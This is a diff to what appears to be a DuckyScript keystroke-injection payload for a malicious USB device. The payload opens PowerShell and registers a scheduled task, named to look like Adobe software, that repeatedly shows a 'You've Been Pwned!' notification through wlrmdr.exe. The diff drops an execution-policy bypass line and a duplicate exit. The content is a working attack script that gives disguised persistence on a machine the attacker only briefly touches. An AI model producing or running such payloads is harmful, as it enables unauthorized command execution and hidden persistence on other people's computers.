@@ -5,9 +5,6 @@ DELAY 500
 STRING powershell.exe
 ENTER
 DELAY 500
-STRING PowerShell.exe -ExecutionPolicy Bypass
-ENTER
-DELAY 500
 STRING $action = New-ScheduledTaskAction -Execute 'wlrmdr.exe' -Argument " -s 60000 -f 1 -t You've Been Pwned! -m Remember that USB you plugged in? Pepperidge Farm Remembers. -a o" 
 ENTER
 DELAY 1000
@@ -18,7 +15,4 @@ STRING Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Adobe
 ENTER
 DELAY 500
 STRING exit 
-ENTER
-DELAY 500
-STRING exit
 ENTER
